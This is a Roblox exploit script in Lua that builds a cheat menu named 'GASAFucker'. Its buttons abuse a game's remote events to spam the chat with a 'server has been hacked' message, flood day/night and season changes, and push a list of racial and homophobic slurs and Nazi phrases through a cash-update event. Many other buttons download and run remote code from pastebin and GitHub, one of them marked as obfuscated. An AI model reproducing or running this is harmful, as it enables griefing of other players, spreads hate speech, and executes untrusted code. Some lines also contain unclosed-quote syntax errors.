...
local Win = VLib:Window("GASAFucker", "K4X FE")
local Main = Win:Tab("Stuff")
local Others = Win:Tab("Others")
local Misc = Win:Tab("Misc")
local dont = Win:Tab("Danger Zone")

Main:Button("RP is over...",function()
 while true do 
local A_1 = "Hey kids, roleplay is over.. This server has been hacked." local A_2 = "All" 
local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2)
wait(60)
end
end)

Main:Button("Spam Day and night",function()
while true do
game.ReplicatedStorage.RemoteEvents.Priv:FireServer("Day")
wait(0.01)
game.ReplicatedStorage.RemoteEvents.Priv:FireServer("Night")
wait(0.01)
end
end)

Main:Button("Spam Season",function()
while true do
game.ReplicatedStorage.RemoteEvents.Priv:FireServer("Season")
wait(0.01)
end
end)

Main:Button("Update Cash",function()
while true do
...
local lol = {
    ...
    "aalex#2536\nYourLifeSucksOnIce";
    "aalex#2536\nHeilHitler";
    "aalex#2536\nWeAreCharasploitUsers";
    "aalex#2536\nGasa4SucksAss";
    "aalex#2536\nOhFeelYaMyCock";
    "aalex#2536\nNiggerFaggot";
    "aalex#2536\nWhoeverPlaysThisGameIsAnStreetshitter";
    "aalex#2536\nhttps://youtu.be/iAC4Q5huMIM";
}

game.ReplicatedStorage.RemoteEvents.UpdateCash:FireServer(""..lol[math.random(1, #lol)].."")
wait(0.5)
end
end)

Main:Button("misoneme GASA4 Admin",function()
loadstring(game:HttpGet("https://pastebin.com/raw/Zwy3XvGQ"))()
end)

Others:Button("Infinite Yield FE",function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
end)

Others:Button("Unnamed ESP",function()
loadstring(game:HttpGet("https://pastebin.com/raw/kvr0AuWz"))()
end)

Others:Button("Pet Simulator X GUI",function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/SHAREHACK/script/main/psx'))()
end)

Others:Button("Work at a pizza place Auto Farm",function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/oShyyyyy/iris-jhub/main/WorkAtpizzaplace'))()
end)

Others:Button("Wolf hub",function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Napkinboi/Wolf-hub/main/NapkinBoi"))()
end)

Misc:Button("Fates Admin FE",function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua"))();
end)

Misc:Button("UTG V3 FE (Unstable)",function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/killermaster9999mega/UTG-V3/main/FE%20UTG%20V3.txt"))()
end)

Misc:Button("Kanye Hub",function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/1x2x3/Kanye/main/loadstring.lua'))();
end)

dont:Button("c00lgui FE",function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/alexplaygithub/GASAFucker/main/c00lguiFE.lua'))();
end)

dont:Button("Gravity Gun",function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/Ne0n2680/Roblox-utg/main/gravity%20gun'))();
end)

dont:Button("Btools (Only works in life in paradise)",function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/Ne0n2680/Roblox-utg/main/btools(life%20in%20paradise)'))();
end)

dont:Button("Sword",function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/Ne0n2680/Roblox-utg/main/sword))();
end)

dont:Button("Chat Hax (Obfuscated Script)",function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/Ne0n2680/Roblox-utg/main/chathax))();
end)

dont:Button("Server Admin FE",function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/Ne0n2680/Roblox-utg/main/ServerAdmin'))();
end)
